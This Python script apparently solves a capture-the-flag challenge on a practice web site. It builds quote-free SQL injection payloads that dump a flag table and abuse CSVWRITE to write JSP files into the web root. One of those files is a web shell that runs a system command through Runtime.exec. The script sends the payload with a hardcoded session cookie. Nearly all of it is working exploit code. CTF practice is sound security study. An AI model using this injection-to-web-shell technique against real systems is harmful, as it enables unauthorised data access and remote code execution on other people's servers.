import hashlib
import requests_html

session = requests_html.HTMLSession()

def getFlag():
    return "' UNION SeLECT concat(concat(name, ': '), id), null, null FROM flag;-- a"

def sqlChrNoQuotes(c):
    return "char(" + str(ord(c)) + ")"

def sqlStrNoQuotes(s):
    ret = 'concat('
    for c in s[:-1]:
        ret += 'char('
        ret += str(ord(c))
        ret += '), '
    ret += 'char('
    ret += str(ord(s[-1]))
    ret += '))'
    return ret

def writeFile():
    ret = "' UNION SeLECT CSVWRITE("
    ret += sqlStrNoQuotes("webapps/ROOT/test.jsp")
    ret += ", "
    ret += sqlStrNoQuotes("SELECT '<%= \"Hello\" %>'")
    ret += ", "
    ret += sqlStrNoQuotes("UTF-8")
    ret += ", "
    ret += sqlChrNoQuotes("b")
    ret += ", "
    ret += sqlChrNoQuotes("\n")
    ret += ", "
    ret += sqlChrNoQuotes("d")
    ret += "), null, null;-- a"
    return ret

def runCommand():
    ret = "' UNION SeLECT CSVWRITE("
    ret += sqlStrNoQuotes("webapps/ROOT/rce3.jsp")
    ret += ", "
    # This is where the magic happens
    ret += sqlStrNoQuotes("SELECT '<%= try { int i = 1 / 0; } catch(Exception e) { out.println(Runtime.getRuntime().exec(\"whoami\").getClass()); } %>'")
    ret += ", "
    ret += sqlStrNoQuotes("UTF-8")
    ret += ", "
    ret += sqlChrNoQuotes("b")
    ret += ", "
    ret += sqlChrNoQuotes("\n")
    ret += ", "
    ret += sqlChrNoQuotes("d")
    ret += "), null, null;-- a"
    return ret

def makePayload():
    return runCommand()

def main():
    h = hashlib.new("md5")
    h.update(b"challenge9")
    challenge = h.hexdigest()
    protocol = "http://"
    host = "divachampions.herokuapp.com"
    path = "/challenges/" + challenge + ".jsp"
    query = "?lookup=" + makePayload()
    url = protocol + host + path + query
    resp = session.get(url, cookies={ "DIVA_token": "C2FF4D4EB30046C41CF379C4" })
    print(resp.text)

if __name__ == '__main__':
    main()
